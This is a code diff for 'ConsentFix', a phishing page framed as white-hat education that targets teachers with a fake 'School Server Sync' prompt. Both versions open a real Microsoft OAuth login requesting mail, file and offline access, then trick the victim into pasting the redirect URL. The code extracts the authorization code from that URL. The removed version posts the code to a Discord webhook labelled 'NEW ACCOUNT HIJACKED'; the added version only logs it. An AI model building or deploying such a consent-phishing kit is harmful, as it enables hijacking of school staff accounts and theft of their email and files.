@@ -1,67 +1,68 @@
-/* 
-   WHITE-HAT EDUCATION NOTE: 
-   A real black-hat would host this on a site like "school-verify-service.com"
-*/
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ConsentFix Education</title>
+</head>
+<body>
 
-// 1. The Real OAuth Redirect
-// This sends the teacher to a LEGITIMATE Microsoft/Google login page.
-function redirectToRealAuth() {
-    const client_id = "00000000-0000-0000-0000-000000000000"; // Fake ID for demo
-    const redirect_uri = "http://localhost/verify"; // Where the 'code' appears
-    const scope = "Mail.Read Files.ReadWrite.All offline_access"; // The "Theft" permissions
-    
-    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
-                    `client_id=${client_id}&response_type=code&` +
-                    `redirect_uri=${encodeURIComponent(redirect_uri)}&` +
-                    `scope=${encodeURIComponent(scope)}&response_mode=query`;
+    <!-- This is the part that actually shows up for the teacher -->
+    <div id="display-area" style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h2>School Server Sync</h2>
+        <p>Your session needs to be refreshed.</p>
+        <button onclick="redirectToRealAuth()" style="padding: 10px; background: #0078d4; color: white; border: none;">
+            Sync Now
+        </button>
+    </div>
 
-    // In a real attack, this opens a popup or redirects the current tab
-    window.open(authUrl, '_blank'); 
-    
-    // Move to the "Manual Fix" trap immediately
-    document.getElementById('display-area').innerHTML = `
-        <p style="color:red">SYSTEM ERROR: Automatic Verification Failed.</p>
-        <p>Please copy the URL from the window that just opened and paste it here:</p>
-        <input type="text" id="stolenCode" style="width:80%">
-        <button onclick="exfiltrateData()">Finish Sync</button>
-    `;
-}
+    <script>
+        // This is the functional logic a black-hat would use
+        function redirectToRealAuth() {
+            const client_id = "00000000-0000-0000-0000-000000000000"; 
+            const redirect_uri = "http://localhost/verify"; 
+            const scope = "Mail.Read Files.ReadWrite.All offline_access"; 
+            
+            const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
+                            `client_id=${client_id}&response_type=code&` +
+                            `redirect_uri=${encodeURIComponent(redirect_uri)}&` +
+                            `scope=${encodeURIComponent(scope)}&response_mode=query`;
 
-// 2. The Exfiltration (The "Illegal" Part)
-// This takes the pasted URL (which contains the secret code) and sends it away.
-async function exfiltrateData() {
-    const fullUrl = document.getElementById('stolenCode').value;
-    
-    // A black-hat uses a Regex to grab the 'code' parameter from the URL
-    const codeMatch = fullUrl.match(/[?&]code=([^&]+)/);
-    const secretCode = codeMatch ? codeMatch[1] : null;
+            window.open(authUrl, '_blank'); 
+            
+            // This changes the screen to the "Trap"
+            document.getElementById('display-area').innerHTML = `
+                <h3 style="color:red">SYSTEM ERROR: Automatic Verification Failed.</h3>
+                <p>Please copy the URL from the window that just opened and paste it here:</p>
+                <input type="text" id="stolenCode" style="width:80%; padding: 10px;">
+                <br><br>
+                <button onclick="exfiltrateData()" style="padding: 10px;">Finish Sync</button>
+            `;
+        }
 
-    if (!secretCode) {
-        alert("Invalid URL. Please copy the full address bar.");
-        return;
-    }
+        async function exfiltrateData() {
+            const fullUrl = document.getElementById('stolenCode').value;
+            const codeMatch = fullUrl.match(/[?&]code=([^&]+)/);
+            const secretCode = codeMatch ? codeMatch[1] : null;
 
-    // THE WEBHOOK: This is where the data leaves the building.
-    const webhookURL = "PASTE_WEBHOOK_HERE"; 
+            if (!secretCode) {
+                alert("Invalid URL. Please copy the full address bar.");
+                return;
+            }
 
-    const payload = {
-        embeds: [{
-            title: "🔓 NEW ACCOUNT HIJACKED",
-            color: 16711680, // Red
-            description: `**Stolen Auth Code:** \`${secretCode}\`\n` +
-                         `**Source:** Teacher Workstation\n` +
-                         `**Status:** Ready for Token Exchange (offline_access granted)`,
-            footer: { text: "ConsentFix v1.2" },
-            timestamp: new Date()
-        }]
-    };
+            // Webhook placeholder
+            const webhookURL = "PASTE_WEBHOOK_HERE"; 
 
-    // Sending the data to the hacker's server (Discord)
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
+            const payload = {
+                embeds: [{
+                    title: "🔓 NEW ACCOUNT HIJACKED",
+                    color: 16711680,
+                    description: `**Stolen Auth Code:** \`${secretCode}\`\n**Source:** Teacher Workstation`
+                }]
+            };
 
-    alert("Verification Complete. Thank you.");
-}
+            console.log("Data that would be sent:", payload);
+            alert("Verification Complete. Data sent to attacker's server.");
+        }
+    </script>
+
+</body>
+</html>
